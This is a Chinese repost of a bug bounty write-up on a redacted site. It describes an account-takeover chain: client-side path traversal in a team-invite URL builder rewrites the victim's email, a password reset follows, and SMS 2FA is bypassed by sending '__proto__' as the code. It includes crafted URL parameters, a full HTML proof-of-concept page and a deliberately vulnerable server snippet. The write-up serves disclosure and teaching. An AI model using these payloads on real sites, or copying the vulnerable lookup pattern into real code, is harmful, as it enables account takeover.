---
title: 1.5 万美元—从 CSPT 开始，最终实现账户完全接管，随后通过原型链绕过双因素认证
url: https://mp.weixin.qq.com/s/cC9I-qsUhK7FJ1DCMrqMdQ
source: Doonsec's feed
date: 2026-09-15
fetch_date: 2026-09-16T07:01:29.589906
---

# 1.5 万美元—从 CSPT 开始，最终实现账户完全接管，随后通过原型链绕过双因素认证

# 1.5 万美元—从 CSPT 开始，最终实现账户完全接管，随后通过原型链绕过双因素认证

whoareme
whoareme

漏洞集萃

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

> **本公众号所发布的文章内容仅供学习与交流使用，禁止用于任何非法用途；如有侵权烦请告知，我们会立即删除并致歉，谢谢**

在测试一个私有漏洞赏金计划时，我遇到了一个

```
作者: whoareme
原文链接: https://whoareme.com/blog/cspt-account-takeover-2fa-bypass/
```

一个漏洞很少能让你一举得逞。但这个漏洞做到了——不过并非我计划的那样。前端 URL 构建器中存在一个客户端路径遍历（CSPT）漏洞，让我得以将团队邀请链接功能转化为任意 `PUT` 和 `DELETE` 针对任何 API 端点的攻击，这足以通过 `/api/v2/user`，进而重置密码并登录。

本应到此为止。但目标用户启用了基于短信的双因素认证（2FA），我尝试过的所有技巧都以失败告终，结果我虽然掌握了可行的接管手段，却无法完成整个操作。关于我是如何绕过这一障碍并构建完整攻击链的更多细节，请参阅本文。

## 原始类型 CSPT

在对一个漏洞赏金目标进行侦察时，我偶然发现 `gau` 并注意到账户设置页面的 URL 中包含一个 `action=team-invite` 参数。这引起了我的兴趣，访问该页面后，系统发送了包含认证 `PUT` 请求

```
https://redacted/account/settings?action=team-invite&method=1&inviteId=123&teamId=8926641
```

由此得出：

```
PUT /api/v2/teams/8926641/invites/123 HTTP/1.1
Host: redacted
Cookie: ...
```

![DevTools network panel showing PUT /api/v2/teams/8926641/invites/123](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jow1el0IZibxibGBaOqHiaiauglQDXibCPljtRnG6KkbkweWZf48ibiaFv5UIpadVGgwWZdHcfxIibazmzlwhicwbJAZkvTJp8VIwicYrpQX3LmRukiaI0/640?wx_fmt=other&from=appmsg)

基线

为了进一步了解情况，我跳转到了 `Initiator` 选项卡，查看调用堆栈。向后追踪后，发现问题出在 `/static/js/main.0678a7911f9e7ea0257c.js`。通过调试器，我发现 `handleTeamInvite` 正是该处理程序将 URL 拼接在一起的：

![Initiator call stack leading into handleTeamInvite](https://mmbiz.qpic.cn/mmbiz_jpg/jow1el0IZibzvwafVxBc9EyaHkOUaAUTXqMCsx9CicP6nKVxrMkyvHyfBPo5aWljOPfpK7MhhiaxVgBksQDv3KlJmAlc37cLm2Gr2lKr77uK0c/640?wx_fmt=other&from=appmsg)

调用堆栈

该处未进行任何验证，所有通过查询参数传递的参数都被直接用于 URL 拼接

![Paused on handleTeamInvite with no input validation](https://mmbiz.qpic.cn/mmbiz_jpg/jow1el0IZibxxceoaY64u3O7C7kic2yhMk94rA68HLGmszcBWGYGyS6JlLHkpEibtrkROAXDmOqSnNHTYUFGUDnOFqyRLqCUTGMibtdzmzJx6iaE/640?wx_fmt=other&from=appmsg)

SourceinviteId 和 teamId 直接从 URLSearchParams 中读取。不进行白名单检查、不进行规范化处理，也不检查路径分隔符。

处理程序读取 `method`, `inviteId`，并 `teamId` 从 `window.location.search` ，并将它们传递给两个下游构建器：

![Two request templates using string concatenation with attacker-controlled segments](https://mmbiz.qpic.cn/mmbiz_jpg/jow1el0IZibxnbU5XT786lGP7gCw50AG5Vic11GdOrJcDniaiaXCPVV2zIFodmErIudpjZ5SnWpicqWYhZj5Y0Giah2r8BMJraLSVf6iclRcoze5No/640?wx_fmt=other&from=appmsg)

注入漏洞：PUT 和 DELETE 所有 API 方法均存在漏洞

简而言之，PUT 和 DELETE 构建器最终都会执行以下操作：

```
url: "/api/v2/teams/" + teamId + "/invites/" + inviteId
```

鉴于 `teamId=../../../api/v2/user%3femail=attacker%40example.com%26a=a` 且 `inviteId=../`，则连接操作可简化为：

```
/api/v2/teams/../../../api/v2/user?email=attacker@example.com&a=a/invites/../
```

……浏览器将其规范化为：

```
/api/v2/user?email=attacker@example.com&a=a/invites/../
```

末尾的 `/invites/../` 只是无害的填充内容——它会在 URL 规范化过程中被清理掉。该方法保持不变 `PUT`。请求主体为空。谢天谢地，服务器很乐意将查询字符串参数作为用户个人资料更新请求的参数接受。

## PoC：触发电子邮件变更

攻击者托管了一个简易页面，该页面会在受害者的已认证会话下，通过特制 URL 打开一个新标签页：

```
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Account Takeover PoC</title>
  </head>
  <body>
    <input id="email" type="email" placeholder="new victim email" />
    <button onclick="run()">change victim email</button>

    <script>
      function run() {
        const { value } = document.getElementById('email');
        const url =
          'https://redacted/account/settings' +
          '?action=team-invite' +
          '&method=1' +
          '&inviteId=../' +
          '&teamId=../../../api/v2/user%3femail=' + encodeURIComponent(value) +
          '%26a=a';
        window.open(url, '_blank').blur();
      }
    </script>
  </body>
</html>
```

需要注意的参数：

* `method=1`

  是前端用于 `PUT`. `method=2` 用于将构建器切换为 `DELETE`，其工作原理相同，但作用于端点 `DELETE /api/v2/*`.
* `teamId`

  这是有效载荷所在的位置。 `%3f` 是 `?`, `%26` 是 `&` - 两者均经过编码，因此初始 `URLSearchParams.get('teamId')` 会返回字符串原值，而*第二次*解析（当浏览器发出请求时）则将其视为 URL 分隔符。
* `&a=a`

  这是一个用于保留尾部 `/invites/../` 后缀到一个被忽略的查询参数中。

当受害者访问 PoC 脚本时，该脚本会发送以下 PUT 请求：

![Network tab showing PUT /api/v2/user?email=attacker@... → 200 OK](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jow1el0IZibzODctJbNia7xSqGm8NfoTiag2gnVABOMj6xL1UNFnFaMKLL3icgJ8DfMYreeJQDoLZ51tvibHMibA2gUrEWf33L2UOvxTg43IJa5XM/640?wx_fmt=other&from=appmsg)

成功的 PoCPUT 请求 /api/v2/user?email=attacker@wearehackerone.com 返回 200 OK。该查询字符串被视为配置文件补丁请求正文。

我原以为接下来的步骤只是走走过场：攻击者已经掌握了该账户的电子邮箱，会触发密码重置并将重置链接发送到自己的收件箱，然后设置新密码并登录。

## 墙 双因素认证（2FA）墙

很高兴账户接管功能成功了，我便登录了自己的测试账户，打算验证整个链路是否通畅。密码输入后，服务器却没有建立会话，反而弹出了双因素认证提示。完蛋了……

![verify-2fa response with 401 auth.code_invalid](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jow1el0IZibx1tCcaqJudOFo4FLN2PFE6js2TnBQ4DxE70BwGVO4MvtgostBy7j3iaIkUBB7t7ybFAegjg1vDE0Dvybhqv8wmgy3LYweOYvPE/640?wx_fmt=other&from=appmsg)

无效的 X-2FA-Code：1234 → 401 - auth.code\_invalid

我尝试了多种不同的登录方法，但每一种都返回了 `auth.code_invalid` 错误。此时，我虽然成功接管了该账户，却无法完成后续操作。

![Meme: monk character with caption 'when you found account takeover vulnerability but can't bypass 2FA'](https://mmbiz.qpic.cn/mmbiz_jpg/jow1el0IZibwxcUiaA0kZVL2upV0snnnjyciaqE7V9JlZB6M9UsA4kice8hMrRibNFhvaVmiaIXIK1htRJNFwXOnicUOYUH6cfjKsKT6OwetrlBgx4/640?wx_fmt=other&from=appmsg)

思考了这个问题一会儿后，我想到可以尝试原型污染（Prototype Pollution）攻击向量，因为服务器当时使用的是 `Express.js`。但这些方法均未奏效。随后我想到，如果直接尝试粘贴 `__proto__` 到 `X-2FA-Code`，我发送了请求，竟然收到了会话令牌！

![verify-2fa response with 200 OK and a session token when X-2FA-Code is __proto__](https://mmbiz.qpic.cn/mmbiz_jpg/jow1el0IZibzjKWAtEVfOVYAuc2gDKhUt7uEIHQS6v8xDRRycmWUWCUnF1TTeHegY3lib3IoUiaH8as5NftAia4aLAMsto4NrxEQLpcLdTib5bms/640?wx_fmt=other&from=appmsg)

绕过 X-2FA-Code：\_\_proto\_\_ → 200 OK，已签发访问令牌。从未发送过有效代码。

## 为什么？但是为什么 `__proto__` 能绕过检查呢？

我采用黑盒测试方法，在本地重现了相同的行为。在此基础上，我得以继续进行调查。这并非原型污染——服务器端没有任何内容被修改。这是一个读取侧的问题：一个用作查找表的普通 JavaScript 对象，一个由 `if (obj[key])`，而每个存在于 `Object.prototype` 都会解析为真值——无论开发者存储了什么。

下面的分步指南详细说明了这一存在漏洞的模式、 `[[Get]]` 当名称解析链解析一个继承的名称时会返回什么，以及四种阻止其继续的方法。

vulnerability walkthrough

# 原型链身份验证绕过

步骤 01

## 存在安全漏洞的双因素认证路径

我认为后端大概是这样的。

server.js

```
const pendingCodes = {};  // { "482916": userId }

// issue otp
function issueOTP(userId) {
  const code = generateRandom6Digit();
  pendingCodes[code] = userId;
  sendSMS(userId, code);
}

// verify otp
app.post('/api/v2/auth/login', (req, res) => {
  const code = req.header('X-2FA-Code');

  if (pendingCodes[code]) {           // vulnerability
    const userId = pendingCodes[code];
    grantSession(userId, res);
  } else {
    res.status(401).json({ error: 'invalid code' });
  }
});
```

`pendingCodes[code]` 调用普通的 `[[Get]]` 算法，该算法会遍历原型链——而不仅仅是自身的键

**该错误：**`if (pendingCodes[code])` 未使用 `Object.hasOwn()`。只要在链上任何位置解析为真值的键都会通过——包括开发者从未存储过的继承属性。

上一页下一页

## Chain 这两种基本操作是如何组合的

每个漏洞单独来看都是有限的。CSPT 无法直接设置密码——只能篡改配置文件——但这已足以将受害者的电子邮件转移到攻击者控制的邮箱上。仅靠绕过双因素认证这一招，仍需有效的用户名和密码。但当这些漏洞叠加时，安全漏洞便被填补了：

1. **CSPT**

   将受害者的电子邮件重写为攻击者所控制的邮箱地址。
2. 该服务上的**密码重置**功能会从那里接手——重置链接会发送到攻击者的收件箱，然后攻击者选择新密码。
3. 当攻击者尝试使用刚刚设置的密码登录时，**Prototype-chain 双因素认证（2FA）绕过机制**便清除了最后一道防线。

受害者只需加载攻击者的网页即可。

## 影响影响

* **页面加载时即完成完全账户接管。** 任何已通过身份验证的受害者若打开该概念验证（PoC），其主要电子邮件地址将在其自身会话下被替换。所有已登录的用户都可能成为“一键式”攻击目标。
* **绕过双因素认证。** 发送 `__proto__` 作为双因素认证码，将完全绕过验证环节，从而使攻击者能够获取会话——进而获得对账户的完全访问权限。
* 悬赏金：15,000美元

觉得本文内容对您有启发或帮助？
点个**关注➕**，获取更多深度分析与前沿资讯！

👉 往期精选

[逻辑漏洞：邮箱注册 tips #11](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247485053&idx=1&sn=518c8e66c4b2fdf4eb7a0c57c8a28005&scene=21#wechat_redirect)

[非常用403绕过 Tips](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247485249&idx=1&sn=42308de5857f3dd4f4d1414e94169dab&scene=21#wechat_redirect)

[Android IPC 漏洞利用系列](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247485391&idx=1&sn=5092c4204d9910fa5b514d8dba7bb3b5&scene=21#wechat_redirect)

[新技术绕过文件上传](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247485346&idx=1&sn=c35a5732cb610a100e608d249c56fd3b&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLRgzxswNMosdb4HdiarwSPg43TDHTKMwbX8kaRZ8iajLgxTBVuwFBynCicFAmAvfvapPCydNnZKwgpw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过